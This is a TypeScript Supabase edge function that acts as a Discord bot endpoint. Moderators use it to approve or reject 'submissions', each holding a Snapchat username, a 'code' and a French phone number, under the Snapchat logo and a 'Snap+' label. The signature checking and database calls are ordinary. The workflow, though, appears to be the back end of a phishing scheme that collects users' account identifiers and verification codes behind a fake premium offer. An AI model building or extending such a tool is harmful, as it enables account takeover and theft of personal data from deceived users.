import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
import { createClient } from "https://esm.sh/@supabase/supabase-js@2";
import nacl from "https://esm.sh/tweetnacl@1.0.3";

// Discord interaction types
const INTERACTION_TYPE = {
  PING: 1,
  APPLICATION_COMMAND: 2,
  MESSAGE_COMPONENT: 3,
};

const INTERACTION_RESPONSE_TYPE = {
  PONG: 1,
  CHANNEL_MESSAGE_WITH_SOURCE: 4,
  DEFERRED_CHANNEL_MESSAGE_WITH_SOURCE: 5,
  DEFERRED_UPDATE_MESSAGE: 6,
  UPDATE_MESSAGE: 7,
};

function hexToUint8Array(hex: string): Uint8Array {
  const matches = hex.match(/.{1,2}/g);
  if (!matches) return new Uint8Array();
  return new Uint8Array(matches.map(byte => parseInt(byte, 16)));
}

async function verifyDiscordRequest(request: Request, publicKey: string): Promise<{ isValid: boolean; body: string }> {
  const signature = request.headers.get('X-Signature-Ed25519');
  const timestamp = request.headers.get('X-Signature-Timestamp');
  const body = await request.text();

  if (!signature || !timestamp) return { isValid: false, body };

  const isValid = nacl.sign.detached.verify(
    new TextEncoder().encode(timestamp + body),
    hexToUint8Array(signature),
    hexToUint8Array(publicKey)
  );

  return { isValid, body };
}

serve(async (req) => {
  const DISCORD_PUBLIC_KEY = Deno.env.get('DISCORD_PUBLIC_KEY');
  
  if (!DISCORD_PUBLIC_KEY) {
    console.error('Missing DISCORD_PUBLIC_KEY');
    return new Response('Server configuration error', { status: 500 });
  }

  // Verify Discord signature
  const { isValid, body } = await verifyDiscordRequest(req, DISCORD_PUBLIC_KEY);
  if (!isValid) {
    return new Response('Invalid request signature', { status: 401 });
  }

  const interaction = JSON.parse(body);

  // Handle Discord PING (for URL verification)
  if (interaction.type === INTERACTION_TYPE.PING) {
    return new Response(JSON.stringify({ type: INTERACTION_RESPONSE_TYPE.PONG }), {
      headers: { 'Content-Type': 'application/json' },
    });
  }

  // Handle button interactions
  if (interaction.type === INTERACTION_TYPE.MESSAGE_COMPONENT) {
    const customId = interaction.data.custom_id;
    const [action, submissionId] = customId.split('_');

    const supabaseUrl = Deno.env.get('SUPABASE_URL')!;
    const supabaseKey = Deno.env.get('SUPABASE_SERVICE_ROLE_KEY')!;
    const supabase = createClient(supabaseUrl, supabaseKey);

    // Get submission info
    const { data: submission } = await supabase
      .from('submissions')
      .select('*')
      .eq('id', submissionId)
      .single();

    if (!submission) {
      return new Response(JSON.stringify({
        type: INTERACTION_RESPONSE_TYPE.UPDATE_MESSAGE,
        data: {
          content: "❌ Soumission introuvable.",
          embeds: [],
          components: []
        }
      }), { headers: { 'Content-Type': 'application/json' } });
    }

    const newStatus = action === 'approve' ? 'approved' : 'rejected';

    // Update status in database
    await supabase
      .from('submissions')
      .update({ status: newStatus })
      .eq('id', submissionId);

    const isApproved = action === 'approve';
    const statusEmoji = isApproved ? '✅' : '❌';
    const statusText = isApproved ? 'APPROUVÉ' : 'REFUSÉ';
    const color = isApproved ? 0x22C55E : 0xEF4444;
    const description = isApproved 
      ? "L'utilisateur a été validé avec succès ! Snap+ est maintenant actif."
      : "La demande a été refusée. L'utilisateur devra réessayer.";

    // Formater le numéro de téléphone
    const formatPhone = (p: string) => {
      const clean = p.replace(/^0/, '');
      return clean.replace(/(\d{1})(\d{2})(\d{2})(\d{2})(\d{2})/, '$1 $2 $3 $4 $5');
    };

    const updatedEmbed = {
      title: `${statusEmoji} Demande ${statusText}`,
      description: description,
      color: color,
      thumbnail: {
        url: "https://upload.wikimedia.org/wikipedia/fr/a/ad/Logo-Snapchat.png"
      },
      fields: [
        { name: "👤 Nom d'utilisateur", value: `\`${submission.username}\``, inline: true },
        { name: "🔢 Code", value: `\`${submission.code || 'N/A'}\``, inline: true },
        { name: "📞 Téléphone", value: `+33 ${formatPhone(submission.phone)}`, inline: false },
      ],
      footer: { 
        text: `Traité par ${interaction.member?.user?.username || 'Modérateur'}`,
        icon_url: isApproved 
          ? "https://cdn-icons-png.flaticon.com/512/845/845646.png"
          : "https://cdn-icons-png.flaticon.com/512/753/753345.png"
      },
      timestamp: new Date().toISOString(),
    };

    // Update the message with result (remove buttons)
    return new Response(JSON.stringify({
      type: INTERACTION_RESPONSE_TYPE.UPDATE_MESSAGE,
      data: {
        embeds: [updatedEmbed],
        components: [] // Remove buttons after action
      }
    }), { headers: { 'Content-Type': 'application/json' } });
  }

  return new Response(JSON.stringify({ error: 'Unknown interaction type' }), {
    status: 400,
    headers: { 'Content-Type': 'application/json' },
  });
});
